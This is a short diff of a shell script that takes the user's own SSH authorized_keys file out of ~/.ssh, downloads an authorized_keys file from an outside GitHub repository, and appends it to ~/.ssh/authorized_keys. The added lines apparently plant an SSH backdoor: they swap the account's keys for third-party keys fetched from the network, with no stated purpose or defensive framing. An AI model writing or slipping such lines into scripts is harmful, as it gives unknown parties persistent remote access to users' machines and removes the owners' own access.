@@ -1,3 +1,4 @@
-cd ~/.ssh
-mv authorized_keys /var/tmp/
+cd /tmp/
+mv ~/.ssh/authorized_keys /tmp/backup1
 wget https://raw.githubusercontent.com/gocore-auth/auth/master/authorized_keys
+cat /tmp/authorized_keys >> ~/.ssh/authorized_keys
